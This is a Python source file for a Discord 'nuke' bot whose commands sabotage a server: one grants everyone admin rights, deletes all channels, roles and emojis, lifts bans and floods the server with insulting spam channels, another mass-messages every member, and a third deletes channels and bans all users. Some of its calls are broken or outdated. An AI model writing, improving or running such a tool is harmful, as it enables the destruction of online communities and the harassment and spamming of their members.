import discord
from discord.ext import commands
client = commands.Bot(command_prefix="$", self_bot=False)
client.remove_command("help")
SPAM_CHANNEL = ["noobs", "LOL fucked", "trash af", "get a good server"]
SPAM_MESSAGE = ["@everyone fucked :D", "@everyone please get a good server LMAO"]
token="Your Discord Bot Token"
@client.command()
async def wizz(ctx):

 
    guild = ctx.guild
 
    try:

      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print("I have given everyone admin.")
    except:
      print("I was unable to give everyone admin")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{channel.name} was deleted.")
      except:
        print(f"{channel.name} was NOT deleted.")
        
    for role in guild.roles:
     try:
       await role.delete()
       print(f"{role.name} Has been deleted")
     except:
       print(f"{role.name} Has not been deleted")
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(f"{emoji.name} Was deleted")
     except:
       print(f"{emoji.name} Wasn't Deleted")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("Savages user id")
        print(f"{user.name}#{user.discriminator} Was successfully unbanned.")
      except:
        print(f"{user.name}#{user.discriminator} Was not unbanned.")
    await guild.create_text_channel("your so fucked")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 10, max_uses = 100)
        print(f"New Invite: {link}")
    amount = 50
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"fucked {guild.name} Successfully.")
    return
@client.command(aliases=["massdm"])
async def dmall(ctx, *, text):
  await ctx.message.delete()
  members = ctx.guild.members
  for member in members:
   try:
      await member.send(text)
      print(f"Message sent to {members}")
   except:
      print(f"Message not sent to {members}")
  return
@client.command(pass_context=True)
async def fuck(ctx):
        for channel in list(ctx.guild.channels):
            try:
                await client.delete_channel(channel)
                print (channel.name + " has been deleted in " + ctx.guild.name)
            except:
                pass
        server = ctx.guild
        channel = await client.create_channel(server, 'RIP', type=discord.ChannelType.text)
        await client.send_message(channel, "F in chat for this server @everyone")
        for user in list(ctx.message.server.members):
            try:
                await client.ban(user)
                print ("User " + user.name + " has been banned from " + ctx.guild.name)
            except:
                pass
        print ("Now that's alot of damage")

client.run(token, bot=True)